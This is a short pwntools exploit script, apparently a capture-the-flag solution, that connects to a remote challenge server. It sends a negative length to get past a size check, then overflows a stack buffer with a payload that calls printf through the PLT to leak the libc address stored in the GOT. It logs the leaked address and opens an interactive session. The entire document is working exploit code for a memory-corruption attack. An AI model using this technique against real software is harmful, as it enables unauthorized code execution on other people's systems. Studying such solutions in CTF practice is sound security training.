from pwn import *

r = remote("ctf.j0n9hyun.xyz",3019)

print r.recvuntil("?")

r.sendline("-1")

print r. recvuntil("!")

printfgot= 0x804a00c
printfplt = 0x8048370
payload = "a"*48
payload += p32(printfplt)
payload += p32(0x0804852f)
payload += p32(printfgot)

r.sendline(payload)
print r.recvuntil(":")
print r.recvuntil("\n")
#print r.recv(48)
d=r.recv()
addr = u32(d[:4])

log.info("welcome: %#x",addr)
r.interactive()
